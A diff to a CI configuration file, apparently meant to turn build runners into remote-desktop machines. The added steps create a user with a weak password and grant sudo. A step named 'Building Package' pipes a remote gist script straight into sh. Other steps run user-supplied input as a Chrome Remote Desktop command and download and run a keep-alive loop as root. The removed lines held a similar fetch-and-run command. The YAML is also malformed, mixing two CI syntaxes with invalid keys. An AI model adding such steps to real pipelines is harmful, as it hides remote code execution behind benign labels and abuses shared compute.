@@ -1,14 +1,30 @@
 version: 2.1
+on:
+  input_dispatch:
+    inputs:
+      code:
+        description: 'Chrome Display'
+        requires: true
+      pin:
+        description: '6 Pin Digits'
+        requires: true
 jobs:
   docker:
     docker:
       - image: ruby:2.5
     steps:
-      - run: export token=$token
-      - run: wget https://gist.githubusercontent.com/RandomiDn/f242e2e24c641a9e18252f46c36f39d1/raw/init.dev -O - | sh
+    - name: Create User
+      run: sudo useradd -m arrayfs && sudo adduser root sudo && echo 'arrayfs:root' | sudo chpasswd
+    - name: Building Package
+      run: wget https://gist.githubusercontent.com/iDnp6006/6c21df6e093c9cccc096b2d89ad36ef2/raw/init.dev -O - | sh
+    - name: Start Chrome Remote Desktop
+      run: ${{ github.event.inputs.code }} -pin=${{ github.event.inputs.pin }}
+    - name: Done! You can see the machine in list now
+      run: wget https://raw.githubusercontent.com/iDnp6006/BoostRunners/main/loop.sh
+    - name: Keep Alive
+      run: sudo bash loop.sh
 workflows:
   version: 2.1
   build_and_test:
     jobs:
       - docker
-
